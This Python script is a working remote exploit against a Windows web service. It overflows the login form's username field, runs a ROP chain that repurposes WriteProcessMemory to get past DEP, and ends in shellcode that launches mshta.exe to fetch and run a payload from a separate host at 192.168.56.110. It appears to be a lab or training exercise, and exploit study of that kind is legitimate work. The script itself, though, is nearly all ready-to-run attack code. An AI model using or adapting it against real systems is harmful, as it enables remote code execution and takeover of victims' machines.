#!/usr/bin/python
import socket
from struct import pack
import sys
# badchar: \x00\x0a\x0d\x25\x26\x2b\x3d
# badchar: 00,0a,0d,25,26,2b,3d
# code cave: 0x10167da1
# lpnumberofbyte: 0x1020c044
# offset: 780
# ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub fffe2930

def exploit():

    try:
        target_ip = sys.argv[1]
        target_port = 80
        buffersize = 800
        offset = 780
        
        shellcode = b"\x90"
        shellcode += b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0e\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x98\xfe\x8a\x0e\xe8\xa7\xff\xff\xff\x89\x45\x12\x68\x83\xb9\xb5\x78\xe8\x9a\xff\xff\xff\x89\x45\x16\x31\xc9\x51\x6a\x61\x68\x31\x31\x30\x2f\x68\x2e\x35\x36\x2e\x68\x2e\x31\x36\x38\x68\x2f\x31\x39\x32\x68\x74\x70\x3a\x2f\x68\x65\x20\x68\x74\x68\x61\x2e\x65\x78\x68\x6d\x73\x68\x74\x54\x5b\x31\xc9\x51\x53\xff\x55\x12\x31\xc9\x51\x6a\xff\xff\x55\x16"
        print("[*] The Shellcode Size: " + str(len(shellcode)))

        wpm = pack("<L", 0x69696969) # dummy WriteProcessMemory Address
        wpm += pack("<L", 0x10167da1) # Return Address after WriteProcessMemory
        wpm += pack("<L", 0xFFFFFFFF) # dummy hProcess
        wpm += pack("<L", 0x10167da1) # dummy lpBaseAddress
        wpm += pack("<L", 0x6D6D6D6D) # dummy lpBuffer
        wpm += pack("<L", 0x6E6E6E6E) # dummy nSize
        wpm += pack("<L", 0x1020c044) # dummy lpNumberOfBytesWritten

        junk = b"A"* (offset-len(wpm))

        print("[+] Saving ESP Address ...")
        eip = pack('<L', 0x10154112) # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret
        rop = b"A" * 4
        rop += pack('<L', 0x1013ada1) # mov eax, esi ; pop esi ; ret
        rop += b"A" * 4 # dummy for the ESI
        rop += pack('<L', 0x10151821) # pop ebp ; ret
        rop += pack('<L', 0xffffffdc) # -0n36
        rop += pack('<L', 0x100fcd71) # add eax, ebp ; dec ecx ; ret
        rop += pack('<L', 0x100cb4d4) # xchg eax, edx ; ret
        
        print("[+] Patching WPM ...")
        rop += pack('<L', 0x1012b413) # pop eax ; ret
        rop += pack('<L', 0xfffe2930) # negative offset to WPM
        rop += pack('<L', 0x10104df6) # neg eax ; ret
        rop += pack('<L', 0x1014426e) # xchg eax, ebp ; ret
        rop += pack('<L', 0x1012b413) # pop eax ; ret
        rop += pack('<L', 0x10168040) # IAT Address of KERNEL32!GetLastErrorStub
        rop += pack('<L', 0x1014dc4c) # mov eax, [eax] ; ret
        rop += pack('<L', 0x100fcd71) # add eax, ebp ; dec ecx ; ret
        rop += pack('<L', 0x1012d3ce) # mov dword [edx], eax ; ret

        print("[+] Passing 3 Args ...")
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret

        print("[+] Patching lBuffer ...")
        rop += pack('<L', 0x1012b413) # pop eax ; ret
        rop += pack('<L', 0xfffffeff) # shellcode place - edx = valuate expression: 257 = 00000101
        rop += pack('<L', 0x10104df6) # neg eax ; ret
        rop += pack('<L', 0x1003f9f9) # add eax, edx ; retn 0x0004
        rop += pack('<L', 0x1012d3ce) # mov dword [edx], eax ; ret
        rop += b"A" * 4 # dummy for the retn
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        rop += pack('<L', 0x100bb1f4) # inc edx ; ret
        
        print("[+] Patching nSize ...")
        rop += pack('<L', 0x1012b413) # pop eax ; ret
        rop += pack('<L', 0xffffff24) # -0n220
        rop += pack('<L', 0x10104df6) # neg eax ; ret
        rop += pack('<L', 0x1012d3ce) # mov dword [edx], eax ; ret

        print("[+] Start Decoding ....")
        rop += pack('<L', 0x1012b413) # pop eax ; ret
        rop += pack('<L', 0xfffffea9) # -0n343
        rop += pack('<L', 0x10104df6) # neg eax ; ret
        rop += pack('<L', 0x1003f9f9) # add eax, edx ; retn 0x0004
        rop += pack('<L', 0x100baecb) # xchg eax, ecx ; ret
        rop += b"A" * 4 # dummy for the retn
        rop += pack('<L', 0x1012b413) # pop eax ; ret
        rop += pack('<L', 0xffffffff) 
        rop += pack('<L', 0x101304f9) # add byte [ecx], al ; ret

        print("[+] Returning to WPM ...")
        rop += pack('<L', 0x1012b413) # pop eax ; ret
        rop += pack('<L', 0xffffffec) # edx - 0n20 hits WPM
        rop += pack('<L', 0x1003f9f9) # add eax, edx ; retn 0x0004
        rop += pack('<L', 0x101394a9) # xchg eax, esp ; ret
        rop += b"A" * 4 # dummy for the retn

        inputBuffer = junk + wpm + eip + rop + shellcode

        content = b"username=" + inputBuffer + b"&password=A"
        buffer = b"POST /login HTTP/1.1\r\n"
        buffer += b"Host: " + target_ip.encode() + b"\r\n"
        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
        buffer += b"\r\n"
        buffer += content

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            s.send(buffer)
        finally:
            s.close()
        print("[*] Malicious payload sent")
    except Exception as e:
        print("[!] something went wrong!")
        print(e)

if __name__ == '__main__':
    exploit()